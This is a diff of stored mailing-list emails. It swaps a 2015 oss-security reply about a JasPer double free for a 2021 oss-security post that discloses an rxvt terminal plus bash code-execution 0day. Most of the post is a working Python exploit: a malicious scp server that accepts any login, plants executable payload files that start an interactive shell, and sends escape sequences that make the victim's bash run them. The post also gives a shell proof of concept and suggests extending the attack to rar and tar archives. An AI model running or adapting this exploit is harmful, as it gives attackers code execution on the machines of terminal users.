@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1567" "Sunday" "16" "August" "2015" "18:48:49" "+0000" "mancha" "mancha1@zoho.com" "<20150816184849.GA32213@zoho.com>" "44" "Re: [oss-security] Double free corruption in JasPer JPEG-2000 implementation (CVE-2015-5203)" nil nil nil "8" "2015081618:48:49" "[oss-security] Double free corruption in JasPer JPEG-2000 implementation (CVE-2015-5203)" (number mark "        mancha1@zoho Aug 16   44/1567  " thread-indent "\"Re: [oss-security] Double free corruption in JasPer JPEG-2000 implementation (CVE-2015-5203)\"\n") "<CACn5sdSnp7LMeeV_rFbgVQCeQkoqGGTvHLZ3Xo_xgU70bhbOYw@mail.gmail.com>" ("<CACn5sdSnp7LMeeV_rFbgVQCeQkoqGGTvHLZ3Xo_xgU70bhbOYw@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6746" "Monday" "17" "May" "2021" "16:49:04" "+0300" "def" "def@huumeet.info" nil "170" "[oss-security] rxvt terminal (+bash) remoteish code execution 0day" nil nil nil "5" nil nil (number mark "U       def@huumeet. May 17  170/6746  " thread-indent "\"[oss-security] rxvt terminal (+bash) remoteish code execution 0day\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] rxvt terminal (+bash) remoteish code execution 0day" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 14330 invoked by uid 550); 16 Aug 2015 18:49:14 -0000
+Received: (qmail 14328 invoked by uid 550); 17 May 2021 13:55:25 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,71 +11,185 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 14288 invoked from network); 16 Aug 2015 18:49:12 -0000
-DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws; 
-  s=zapps768; d=zoho.com; 
-  h=date:from:to:cc:subject:message-id:references:mime-version:content-type:in-reply-to; 
-  b=HVF4MQQncwu+90N+yOXbJstqx2NcoWJA+hpOnlnvA02MPom/rEhdBlbRJzX6hX2ltZ3BQH38k1mg
-    qNVU2F/YhigWyg+SOS1L2T+reouci7fyx8BdTZemii6TiTwCfXjn  
-Message-ID: <20150816184849.GA32213@zoho.com>
-References: <CACn5sdSnp7LMeeV_rFbgVQCeQkoqGGTvHLZ3Xo_xgU70bhbOYw@mail.gmail.com>
-MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha512;
-	protocol="application/pgp-signature"; boundary="3V7upXqbjpZ4EhLz"
-Content-Disposition: inline
-In-Reply-To: <CACn5sdSnp7LMeeV_rFbgVQCeQkoqGGTvHLZ3Xo_xgU70bhbOYw@mail.gmail.com>
-X-PGP-Key: http://hkps.pool.sks-keyservers.net/pks/lookup?op=vindex&search=0x25168eb24f0b22ac
-X-PGP-FP: 56B7 100E F4D5 811C 8FEF  ADD1 2516 8EB2 4F0B 22AC
-X-Zoho-Virus-Status: 1
-Cc: gustavo.grieco@gmail.com
-Date: Sun, 16 Aug 2015 18:48:49 +0000
-From: mancha <mancha1@zoho.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] Double free corruption in JasPer JPEG-2000
- implementation (CVE-2015-5203)
+Received: (qmail 6066 invoked from network); 17 May 2021 13:49:15 -0000
+Date: Mon, 17 May 2021 16:49:04 +0300
+From: def <def@huumeet.info>
 To: oss-security@lists.openwall.com
-
---3V7upXqbjpZ4EhLz
-Content-Type: text/plain; charset=us-ascii
+Message-ID: <20210517134904.GA24667@huumeet.info>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
 Content-Disposition: inline
-Content-Transfer-Encoding: quoted-printable
+User-Agent: Mutt/1.10.1 (2018-07-13)
+Subject: [oss-security] rxvt terminal (+bash) remoteish code execution 0day
 
-On Sun, Aug 16, 2015 at 05:22:50PM +0200, Gustavo Grieco wrote:
-> A new double free affecting JasPer JPEG-2000 (libjasper 1.900) has
-> been found triggered by function jasper_image_stop_load.  Despite this
-> library is used by many programs (
-> http://www.ece.uvic.ca/~frodo/jasper/#overview), there is no one
-> providing support, so there is no fix so far.
+#!/usr/bin/env python
+# Title: rxvt (remote) code execution over scp with $SHELL=/bin/bash (0day)
+# Version: rxvt 2.7.10, rxvt-unicode 9.22, mrxvt 0.5.4, eterm 0.9.7
+# Author: def <def@huumeet.info>
+# Date: 2021-05-17
+# CVE: N/A
+#
+#------------------------------------------------------------------------------
+# (U)RXVT VULNERABILITY
+#
+# In rxvt-based terminals, ANSI escape sequence ESC G Q (\eGQ, \033GQ, \x1bGQ)
+# queries the availability of graphics and the response is received from stdin.
+# However, rxvt responds to the query with a newline-terminated message, which
+# is retarded and exposes goatse-wide gaping security holes in many popular CLI
+# programs when executed inside an rxvt terminal window.
+#
+# [def@arch ~]$ printf '\eGQ'
+# ^[G0
+# [def@arch ~]$ 0
+# bash: 0: command not found
+#
+# The latter command (i.e., 0) executes automatically without user interaction.
+# The contents of the second command can be somewhat controlled by chaining the
+# printf message with other escape sequences. In particular, a VT52 mode escape
+# sequence \eZ prepends a letter Z and triggers bash's tab completion, allowing
+# the construction of relative paths and, therefore, code execution in the form
+# of running (planted) files from subdirectories in the current directory.
+#
+# URXVT (+BASH) CODE EXECUTION PROOF-OF-CONCEPT -------------------------------
+#
+# % mkdir -p ZZZ && echo 'uname -a; id; date; sh -i' >ZZZ/0 && chmod +x ZZZ/0
+# % urxvt -e bash
+#
+# [def@arch ~]$ printf '\e[?2l\eZ\e<\eGQ'
+# ^[/Z^[G0
+# [def@arch ~]$ ZZZ/0
+# Linux 5.11.1-arch-1 #1 SMP PREEMPT Tue, 23 Feb 2021 14:05:30 x86_64 GNU/Linux
+# uid=1000(def) gid=1001(def) groups=1001(def),43(tor),998(wheel),999(adm)
+# Sun Apr 18 04:25:22 AM EEST 2021
+# sh-5.1$
+#
+# FIX -------------------------------------------------------------------------
+#
+# Don't use rxvt or any of its derivatives. Stay the fuck away from xterm also.
+#
+# st(1) is a viable solution if you ever plan to `cat /var/log/access.log` or
+# otherwise handle untrusted data from questionable sources.
+#
+#------------------------------------------------------------------------------
 
-If you email me your crasher I can look into a fix.
+import logging
+import paramiko
+import socket
+import threading
+logging.basicConfig(level=logging.INFO)
 
->=20
-> This vulnerability was found by QuickFuzz.
->=20
-> Regards, Gustavo.
+"""
+This script implements a scp server that exploits insecure ANSI escape sequence
+handling in client's (u)rxvt terminal (and bash shell). A recursive (-r) copy
+into the current directory leads to code execution. For example:
 
---mancha (https://twitter.com/mancha140)
+    $ scp -r -P2222 user@localhost:/backup/or/whatever/ .
 
---3V7upXqbjpZ4EhLz
-Content-Type: application/pgp-signature
+The above command transfers payload files ZZZ/0, ZZZ/1 and ZZZ/Z0 to the client
+and executes one of them (the executed payload depends on the rxvt version).
+"""
 
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
+bind = ('localhost', 2222)
+payload = '#!/bin/sh\nuname -a; id; date; sh -i\n'
 
-iQIcBAEBCgAGBQJV0NsRAAoJEB4VYy8JqhaDrrIP/2TLILR8+IRjNPMxpB3BH99S
-OuUhrTKa4BuVjTHO1KdE9t2y0F3PweEQPRFhL+ZB8BGIxgZMv0i/gLuqOTt64SlI
-Hqi1F/vt2NBPP3ckgvN2jGm9O2eC44FZe2Qj9Pqhwb62fPDISKk99TkMsnHXwXbb
-go3yaueq1BYO+Uc0SZBGcI/VAvdZIAdlAxcAhulypFRDuSUqukrn5p2cRL/CkyKP
-gY57DyevFedc8bHLL1c+8/HiNT4RBaZaDMgTzDplUGvisX3PpbQCnA4HXoIdz6my
-cDSMtTEhJpbkuB22qCH0AexpHU6AisQ9iiWbRiWJgVABhr3vIj4YUDs1Q8Wh5cea
-4u29xQYGrFApB6WmsNb+HMxnKk1wECdm79O4fLrZ6LJFRyILqUsjTmcsjEODD+vq
-2zeQ4V7YbRRCSfo+zokaQBYP2n4e4JajaNhT1sXv4i5YjlCFGSxZviB/qelfi196
-XAslrKnokH6JUvuovbraAGGqBZvpgvuoFrUqRon0neemYNaA0tEDCAWvnY06QiEn
-CydxABWNPO8eh6L4KXBPYMQbcXLYbVWu/pEj3thdX+T5V+4JXFy0uyQ1f0BH2jIm
-L80w2ieQgoJL0bWWD12nF3xy0KcASpJ2p2BpLOFc3YiXE8q+xzhNNSpxOk8QEQuF
-unXTTUF6QIIDeUc1kv78
-=bxNc
------END PGP SIGNATURE-----
+class ScpExploitServer(paramiko.ServerInterface):
+    def __init__(self):
+        self.event = threading.Event()
 
---3V7upXqbjpZ4EhLz--
+    def get_allowed_auths(self, username):
+        return "password"
 
+    def check_auth_none(self, username):
+        logging.info('Authenticating as %s', username)
+        return paramiko.AUTH_SUCCESSFUL
+
+    def check_auth_password(self, username, password):
+        logging.info('Authenticating with %s:%s', username, password)
+        return paramiko.AUTH_SUCCESSFUL
+
+    def check_channel_request(self, kind, chanid):
+        logging.info('Opening %s channel %d', kind, chanid)
+        if kind != "session":
+            return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
+        return paramiko.OPEN_SUCCEEDED
+
+    def check_channel_exec_request(self, channel, command):
+        chanid, command = channel.get_id(), command.decode('ascii')
+        logging.info('Approving channel %d exec request: %s', chanid, command)
+        parts = command.split()
+        assert len(parts) > 2 and parts[0] == 'scp' and '-f' in parts
+        threading.Thread(target=self.exploit, args=[channel]).start()
+        return True
+
+    def exploit(self, channel):
+        def wait(): assert channel.recv(4096) == b'\x00'
+        def send(): channel.sendall(b'\x00')
+        fdir, fname0, fname1, fname2 = 'ZZZ', '0', '1', 'Z0'
+        wait()
+
+        # (1) Create subdirectory './ZZZ/'
+        logging.info('Enter "%s/" (channel %d)', fdir, channel.get_id())
+        command = 'D0755 0 {}\n'.format(fdir).encode('ascii')
+        channel.sendall(command)
+        wait()
+
+        # (2) Save the payload as './ZZZ/0', './ZZZ/1' and './ZZZ/Z0'
+        logging.info('Send file "%s" (channel %d)', fname0, channel.get_id())
+        command = 'C0755 {} {}\n'.format(len(payload), fname0).encode('ascii')
+        channel.sendall(command)
+        wait()
+        channel.sendall(payload)
+        send()
+        wait()
+        #channel.sendall_stderr("\x1b[1A".encode('ascii'))
+
+        logging.info('Send file "%s" (channel %d)', fname1, channel.get_id())
+        command = 'C0755 {} {}\n'.format(len(payload), fname1).encode('ascii')
+        channel.sendall(command)
+        wait()
+        channel.sendall(payload)
+        send()
+        wait()
+        #channel.sendall_stderr("\x1b[1A".encode('ascii'))
+
+        logging.info('Send file "%s" (channel %d)', fname2, channel.get_id())
+        command = 'C0755 {} {}\n'.format(len(payload), fname2).encode('ascii')
+        channel.sendall(command)
+        wait()
+        channel.sendall(payload)
+        send()
+        wait()
+
+        # (3) Run the payload with ANSI escapes sequences (in (u)rxvt + bash)
+        channel.sendall_stderr("\033[?2l\033Z\033<\033GQ".encode('ascii'))
+        channel.sendall_stderr("\x1b[1A".encode('ascii'))
+        channel.close()
+
+if __name__ == '__main__':
+    logging.info('Creating a temporary RSA host key ...')
+    host_key = paramiko.rsakey.RSAKey.generate(1024)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind(bind)
+    sock.listen(0)
+    logging.info('Listening at %s:%d ...', bind[0], bind[1])
+    while True:
+        try:
+            client, addr = sock.accept()
+            logging.info('Received connection from %s:%s', *addr)
+            transport = paramiko.Transport(client)
+            transport.add_server_key(host_key)
+            transport.start_server(server=ScpExploitServer())
+        except Exception as ex:
+            logging.error('Connection closed: %s', ex)
+        except KeyboardInterrupt:
+            logging.info('Stopping server')
+            break
+
+#------------------------------------------------------------------------------
+# EXERCISE FOR THE READER
+#
+# Achieve code execution in `unrar x foo.rar` / `busybox tar -xvf bar.tar` with
+# an archive containing payload(s) and a trigger file named "\e[?2l\eZ\e<\eGQ".
+#------------------------------------------------------------------------------
